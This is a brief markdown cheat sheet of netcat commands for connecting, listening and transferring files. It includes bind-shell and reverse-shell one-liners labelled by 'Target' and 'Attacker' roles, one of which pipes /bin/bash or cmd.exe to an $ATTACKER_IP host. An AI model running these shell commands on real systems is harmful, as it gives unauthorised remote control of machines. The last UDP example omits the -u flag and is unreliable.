# Netcat

The Swiss Army knife of networking and security.

## Connect to remote port

```bash
nc -nv $REMOTE_IP $REMOTE_PORT
```

## Listen for a connection on all interfaces

```bash
nc -nlvp $LISTEN_PORT
```

## Listen for a connection on a particular interface

```bash
nc -nlvp $LISTEN_PORT -s $LISTEN_IP
```

## File Transfer

```bash
nc -nv $REMOTE_IP $REMOTE_PORT < $FILE_PATH
```

## File Reception

```bash
nc -nlvp $LISTEN_PORT > $FILE_PATH
```

## Bind Shell

* Target:

```bash
nc -nlvp $TARGET_LISTEN_PORT -e [/bin/bash or cmd.exe]
```

* Attacker:

```bash
nc -nv $TARGET_IP $TARGET_LISTEN_PORT
```

## Reverse Shell

* Attacker:

```bash
nc -nlvp $ATTACKER_LISTEN_PORT
```

* Target:

```bash
nc -nv $ATTACKER_IP $ATTACKER_LISTEN_PORT -e [/bin/bash or cmd.exe]
```

## Connect to a remote UDP port

```bash
nc -nuv $REMOTE_IP $REMOTE_PORT
```

## Listen for a connection on a particular UDP port

```bash
nc -nlvp $LISTEN_PORT
```
